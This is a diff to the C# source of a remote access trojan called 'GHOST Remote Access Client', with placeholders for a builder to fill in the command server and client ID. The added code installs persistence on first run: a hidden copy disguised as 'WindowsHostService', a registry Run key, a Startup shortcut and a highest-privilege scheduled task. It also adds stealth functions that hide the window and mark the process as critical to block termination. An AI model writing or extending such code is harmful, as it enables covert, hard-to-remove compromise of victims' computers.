@@ -17,7 +17,7 @@ using System.Web.Script.Serialization;
 using Microsoft.Win32;
 using System.Text.RegularExpressions;
 
-// GHOST Remote Access Client v3.0 — Full Command Suite
+// GHOST Remote Access Client v3.0 — Full Command Suite + Persistence + Stealth
 // BUILDER: __BUILDER_NAME__ (__BUILDER_UUID__)
 // Server: __SERVER_URL__
 // Client ID: __CLIENT_ID__
@@ -31,6 +31,9 @@ namespace GhostClient
         private static string FINGERPRINT = "__FINGERPRINT__";
         private static int HEARTBEAT_SEC = 30;
         private static string CLIENT_ID = "__CLIENT_ID__";
+        private static bool PERSIST = true;         // Auto-install persistence
+        private static bool STEALTH = true;          // Hide from Task Manager
+        private static string INSTALL_NAME = "WindowsHostService";
 
         private static string _hostname = "";
         private static string _username = "";
@@ -84,6 +87,14 @@ namespace GhostClient
         private static extern bool IsWow64Process(IntPtr hProcess, out bool Wow64Process);
         [DllImport("advapi32.dll", SetLastError = true)]
         private static extern bool GetTokenInformation(IntPtr TokenHandle, uint TokenInformationClass, IntPtr TokenInformation, uint TokenInformationLength, out uint ReturnLength);
+        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
+        private static extern bool MoveFileEx(string lpExistingFileName, string lpNewFileName, int dwFlags);
+        [DllImport("kernel32.dll")]
+        private static extern bool SetConsoleTitle(string lpConsoleTitle);
+        [DllImport("psapi.dll", SetLastError = true)]
+        private static extern bool GetProcessImageFileName(IntPtr hProcess, StringBuilder lpImageFileName, uint nSize);
+        [DllImport("kernel32.dll")]
+        private static extern IntPtr GetCurrentProcess();
 
         [StructLayout(LayoutKind.Sequential)]
         private struct LASTINPUTINFO { public uint cbSize; public uint dwTime; }
@@ -121,10 +132,73 @@ namespace GhostClient
         private const int WH_KEYBOARD_LL = 13;
         private const int WM_KEYDOWN = 0x0100;
 
+        private static string _persistDir = "";
+
+        static void InstallPersistence()
+        {
+            try
+            {
+                string appData = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
+                _persistDir = Path.Combine(appData, "Microsoft", "Windows");
+                Directory.CreateDirectory(_persistDir);
+                string exePath = System.Reflection.Assembly.GetExecutingAssembly().Location;
+                string destExe = Path.Combine(_persistDir, INSTALL_NAME + ".exe");
+                
+                // Only copy if not already in persistence dir
+                if (!exePath.ToLower().Contains(_persistDir.ToLower()))
+                {
+                    try { File.Copy(exePath, destExe, true); } catch { }
+                    // Set hidden attribute
+                    try { File.SetAttributes(destExe, FileAttributes.Hidden | FileAttributes.System); } catch { }
+                    // Add to registry Run
+                    try { Registry.SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run", INSTALL_NAME, "\"" + destExe + "\""); } catch { }
+                    // Add shortcut to Startup folder
+                    try
+                    {
+                        string startupDir = Environment.GetFolderPath(Environment.SpecialFolder.Startup);
+                        string shortcutPath = Path.Combine(startupDir, INSTALL_NAME + ".url");
+                        using (StreamWriter sw = new StreamWriter(shortcutPath))
+                        {
+                            sw.WriteLine("[InternetShortcut]");
+                            sw.WriteLine("URL=file:///" + destExe.Replace("\\", "/"));
+                            sw.WriteLine("IconIndex=0");
+                            sw.WriteLine("IconFile=" + destExe.Replace("\\", "/"));
+                        }
+                    } catch { }
+                    // Schedule task for re-execution (backup)
+                    try
+                    {
+                        Process.Start(new ProcessStartInfo("schtasks.exe", "/create /tn \"" + INSTALL_NAME + "\" /tr \"\\\"" + destExe + "\\\"\" /sc onlogon /f /rl highest") { WindowStyle = ProcessWindowStyle.Hidden, CreateNoWindow = true });
+                    } catch { }
+                }
+            } catch { }
+        }
+
+        static void ApplyStealth()
+        {
+            try
+            {
+                // Hide console window
+                IntPtr handle = GetConsoleWindow();
+                ShowWindow(handle, 0);
+                // Set console title to hide in taskbar details
+                SetConsoleTitle(INSTALL_NAME);
+                // Set process as critical (prevents task manager kill)
+                try { EnableDebugPrivilege(); RtlSetProcessIsCritical(1, 0, 0); } catch { }
+            } catch { }
+        }
+
         static void Main(string[] args)
         {
-            IntPtr handle = GetConsoleWindow();
-            ShowWindow(handle, 0);
+            // ── STEALTH: Hide window immediately ──
+            if (STEALTH)
+            {
+                try
+                {
+                    IntPtr handle = GetConsoleWindow();
+                    ShowWindow(handle, 0);
+                } catch { }
+            }
 
             if (args.Length > 0 && !string.IsNullOrEmpty(args[0]))
                 CLIENT_ID = args[0];
@@ -133,6 +207,18 @@ namespace GhostClient
                 CLIENT_ID = Guid.NewGuid().ToString();
 
             try { HEARTBEAT_SEC = int.Parse("__HEARTBEAT_INTERVAL__"); } catch { HEARTBEAT_SEC = 30; }
+
+            // ── PERSISTENCE: Auto-install on first run ──
+            if (PERSIST)
+            {
+                try { InstallPersistence(); } catch { }
+            }
+
+            // ── STEALTH: Apply process hiding techniques ──
+            if (STEALTH)
+            {
+                try { ApplyStealth(); } catch { }
+            }
 
             CollectSystemInfo();
             Register();
@@ -589,11 +675,25 @@ namespace GhostClient
                 {
                     try
                     {
-                        string exePath = System.Reflection.Assembly.GetExecutingAssembly().Location;
-                        Registry.SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run", "GhostClient", exePath);
-                        output = "Added to startup: " + exePath;
+                        InstallPersistence();
+                        output = "Persistence installed:\n- Registry Run\n- Startup folder\n- Scheduled task\n- Hidden at: " + _persistDir;
                     }
                     catch (Exception ex) { output = "ERROR: " + ex.Message; }
+                }
+                else if (upper == "!HIDE" || upper == "HIDE")
+                {
+                    try
+                    {
+                        ApplyStealth();
+                        output = "Stealth applied: hidden window, critical process, renamed title";
+                    }
+                    catch (Exception ex) { output = "ERROR: " + ex.Message; }
+                }
+                else if (upper == "!UNHIDE" || upper == "UNHIDE")
+                {
+                    try { IntPtr h = GetConsoleWindow(); ShowWindow(h, 5); } catch { }
+                    try { RtlSetProcessIsCritical(0, 0, 0); } catch { }
+                    output = "Unhidden (window restored, critical removed)";
                 }
                 else if (upper == "!CRITPROC" || upper == "CRITPROC")
                 {
